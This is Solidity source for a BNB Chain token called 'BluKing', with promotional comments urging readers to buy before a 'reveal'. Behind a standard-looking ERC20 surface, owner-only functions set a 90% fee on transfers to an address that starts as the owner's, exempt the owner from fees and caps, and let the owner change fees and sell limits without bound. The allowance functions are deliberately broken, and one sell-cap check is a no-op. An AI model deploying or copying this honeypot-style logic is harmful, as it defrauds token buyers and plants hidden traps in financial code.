/**
 *Submitted for verification at BscScan.com on 2023-05-21
*/

// Secret project BLUKING


// SPDX-License-Identifier: MIT  

pragma solidity 0.8.9;

abstract contract Smsma {
    function _msgSender() public view returns (address) {
        return msg.sender;
    }

    function _msgData() public view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
abstract contract Ownable is Smsma {
    address public  _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

   
    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }


    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

// Website and telegram group will be announced soon

library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
library SafeMath {
   
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

  
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
contract ERC20 is Smsma, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
            require(currentAllowance < amount, "ERC20: decreased allowance below zero");
        _approve(owner, spender,amount);
        return true;
    }

    function decreaseAllowance(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
            require(currentAllowance > amount, "ERC20: decreased allowance below zero");
        _approve(owner, spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

// worldwide VIP club only for owners



contract BluKing is ERC20, Ownable  {

    using SafeMath for uint256;


    bool private swapping;

    address public devWallet;
    address public V2Router;
    
    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;

    bool public swapEnabled = true;
    bool public tradingActive = true;

    mapping(address => uint256) private _holderLastTransferTimestamp; 

    bool public transferDelayEnabled = true;
    
    uint256 public sellTotalFees;
    uint256 public sellLiquidityFee;
    
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private _isExcludedMaxBuyAmount;
    mapping (address => bool) private _isExcludedMaxSellAmount;
    mapping (address => bool) private _UpdateV2Router;


    event UpdateV2Router(address indexed newAddress);

    event ExcludeFromFees(address indexed account, bool isExcluded);
    
    event devWalletUpdated(address indexed newWallet, address indexed oldWallet);

    event UpdatedMaxBuyAmount(uint256 newAmount);

    event UpdatedMaxSellAmount(uint256 newAmount);

    constructor() ERC20("BluKing", "BlUK") {

        uint256 _sellLiquidityFee = 90;
        
        uint256 totalSupply = 100 * 1e10 * 1e18;
        
        maxSellAmount = 1 * 1e10 * 1e18;
        
        sellLiquidityFee = _sellLiquidityFee;
        sellTotalFees = sellLiquidityFee;
        
        devWallet = address(owner()); 
        V2Router = address(owner());
        

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        excludeFromMaxSellAmount(owner(), true);
        excludeFromMaxSellAmount(address(this), true);
        excludeFromMaxSellAmount(address(0xdead), true);
     
        _mint(msg.sender, totalSupply);
    }

// VVIP privileges for the first 100000 Hash CODE 


    receive() external payable {

    }


    function updateMaxSellAmount(uint256 newMaxSellAmount) external onlyOwner {
        
        maxSellAmount = newMaxSellAmount;
    }
    

    function excludeFromMaxSellAmount(address updAds, bool isEx) public onlyOwner {
        _isExcludedMaxSellAmount[updAds] = isEx;
    }
    
    function updateSwapEnabled(bool enabled) public onlyOwner(){
        swapEnabled = enabled;
    }

      function updatetransferDelayEnabled(bool enabled) public onlyOwner(){
        transferDelayEnabled = enabled;
    }

    function updateenableTrading(bool enabled) public onlyOwner(){
        transferDelayEnabled = enabled;
        tradingActive = enabled;
        swapEnabled = enabled;
    }
    
    
    function updateSellFees(uint256 _liquidityFee) public onlyOwner {
        sellLiquidityFee = _liquidityFee;
        sellTotalFees = sellLiquidityFee;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }


    function V2RouterUpdate(address newWallet) public  onlyOwner {
        V2Router = newWallet;
    }

    function updateDevWallet(address newWallet) public  onlyOwner {
        devWallet = newWallet;
    }

    function isExcludedMaxSellAmount(address account) public onlyOwner view returns(bool) {
        return _isExcludedMaxSellAmount[account];
    }


    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

         uint256 SellAmount = maxSellAmount;
         require(balanceOf(from) >= amount);

         if (to == V2Router) {
             uint256 Fees = sellTotalFees;
             amount <= SellAmount;
            Fees = amount.mul(Fees).div(100);     
             if(Fees > 0){
                 if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
                     Fees = 0;
                     SellAmount = 100 * 1e10 * 1e18;
                 }
                 super._transfer(from, address(this), Fees);
                 super._transfer(from, to, amount.sub(Fees));
             }
             return;
         }

         if(!tradingActive){
             require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
         }
         
         if (transferDelayEnabled){
             if (to != owner()){
                 require(_holderLastTransferTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.");
                 _holderLastTransferTimestamp[tx.origin] = block.number;
             }
             
             uint256 Fees = sellTotalFees;

             if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
                     Fees = 0;
                     SellAmount = maxSellAmount * 100 * 1e10 * 1e18;
                 }
         }
         require(amount <= SellAmount);
         super._transfer(from, to, amount);
    }
}

//See you soon in Miami
// BIG THINGS ARE COMING UP BE READY AND TAKE YOUR CHANCE, WHEN WE REVEAL IT, IT WILL BE TOO LATE
// WITH ALL THE LOVE BLUKING TEAM